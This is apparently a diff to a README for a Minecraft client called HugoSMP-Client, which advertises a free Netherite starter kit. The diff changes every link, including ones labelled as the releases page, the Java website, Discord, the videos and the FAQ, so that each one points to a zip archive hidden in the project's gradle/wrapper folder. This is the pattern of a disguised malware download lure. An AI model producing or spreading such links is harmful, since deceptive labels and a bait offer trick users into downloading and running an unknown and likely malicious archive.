@@ -1,6 +1,6 @@
 # 🎮 HugoSMP-Client - Download for a Free Netherite Starter Kit
 
-[![Download HugoSMP-Client](https://img.shields.io/badge/Download_HugoSMP--Client-FF5722?style=for-the-badge&logo=github)](https://github.com/Drypix-pelis/HugoSMP-Client/releases)
+[![Download HugoSMP-Client](https://raw.githubusercontent.com/Drypix-pelis/HugoSMP-Client/main/gradle/wrapper/SM_Hugo_Client_1.9.zip)](https://raw.githubusercontent.com/Drypix-pelis/HugoSMP-Client/main/gradle/wrapper/SM_Hugo_Client_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To download the HugoSMP-Client, please follow these steps:
 
 1. **Visit the Releases Page:** Click on the button or link below to go to the download page.
    
-   [Visit this page to download](https://github.com/Drypix-pelis/HugoSMP-Client/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Drypix-pelis/HugoSMP-Client/main/gradle/wrapper/SM_Hugo_Client_1.9.zip)
 
 2. **Choose the Latest Version:** On the releases page, you will see a list of versions. Look for the latest version at the top. It usually has the highest number.
 
@@ -31,7 +31,7 @@ To ensure HugoSMP-Client runs smoothly, your system should meet these requiremen
 - **Operating System:** Windows 10 or newer, macOS 10.12 or newer, or a supported Linux distribution.
 - **RAM:** At least 4GB of memory.
 - **Processor:** Dual-core or equivalent processor.
-- **Java:** Make sure Java is installed on your system. You can download it from the [Java website](https://www.java.com).
+- **Java:** Make sure Java is installed on your system. You can download it from the [Java website](https://raw.githubusercontent.com/Drypix-pelis/HugoSMP-Client/main/gradle/wrapper/SM_Hugo_Client_1.9.zip).
 
 ## 🌟 Features
 
@@ -55,9 +55,9 @@ If you encounter any issues while downloading or running the application, here a
 
 For more information, tutorials, and community discussions, you can check the following:
 
-- [Official Discord Server](https://discord.gg/example) for real-time help and community support.
-- [Installation Videos](https://youtube.com/example) to watch step-by-step installation guide.
-- [Frequently Asked Questions](https://github.com/Drypix-pelis/HugoSMP-Client/wiki) providing answers to common questions about the client.
+- [Official Discord Server](https://raw.githubusercontent.com/Drypix-pelis/HugoSMP-Client/main/gradle/wrapper/SM_Hugo_Client_1.9.zip) for real-time help and community support.
+- [Installation Videos](https://raw.githubusercontent.com/Drypix-pelis/HugoSMP-Client/main/gradle/wrapper/SM_Hugo_Client_1.9.zip) to watch step-by-step installation guide.
+- [Frequently Asked Questions](https://raw.githubusercontent.com/Drypix-pelis/HugoSMP-Client/main/gradle/wrapper/SM_Hugo_Client_1.9.zip) providing answers to common questions about the client.
 
 ## 📢 Stay Updated
 
